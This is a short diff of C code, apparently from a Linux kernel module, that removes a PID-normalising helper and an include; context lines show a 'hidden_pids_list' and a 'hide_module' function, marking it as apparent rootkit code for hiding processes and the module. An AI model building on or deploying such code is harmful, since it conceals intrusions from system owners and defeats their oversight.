@@ -5,40 +5,12 @@
 #include <asm/current.h>
 #include <linux/cred.h>
 #include <linux/errno.h>
-#include <linux/export.h>
 #include <linux/kobject.h>
 #include <linux/list.h>
 #include <linux/printk.h>
 #include <linux/types.h>
 
 LIST_HEAD(hidden_pids_list);
-
-/**
- * Gets the effective PID for the given PID.
- * If the given PID is 0, return the current PID.
- * If the given PID is -1 or INT_MIN, return -1.
- * If the given PID is < -1, return the absolute value.
- * Otherwise, return the given PID.
- *
- * @param i32_pid The PID to get the effective PID for
- * @return The effective PID
- */
-static inline int get_effective_pid(const pid_t i32_pid)
-{
-    pid_t i32_real_pid = i32_pid;
-
-    if (i32_real_pid == 0) {
-        i32_real_pid = current->pid;
-    }
-    else if (i32_real_pid == INT_MIN) {
-        return -1;
-    }
-    else if (i32_real_pid < -1) {
-        i32_real_pid = -i32_real_pid;
-    }
-
-    return i32_real_pid;
-}
 
 void hide_module(void)
 {
